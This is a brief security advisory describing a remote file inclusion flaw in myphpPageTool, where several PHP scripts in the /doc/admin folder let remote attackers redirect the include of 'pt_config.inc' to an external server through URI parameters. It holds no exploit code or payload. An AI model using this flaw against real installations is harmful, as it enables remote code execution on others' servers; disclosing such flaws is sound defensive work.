myphpPageTool is prone to an issue which may allow remote attackers to include files located on remote servers. This issue is present in several PHP script files in the /doc/admin folder.

Under some circumstances, it is possible for remote attackers to influence the include path for 'pt_config.inc' to point to an external file on a remote server by manipulating some URI parameters.
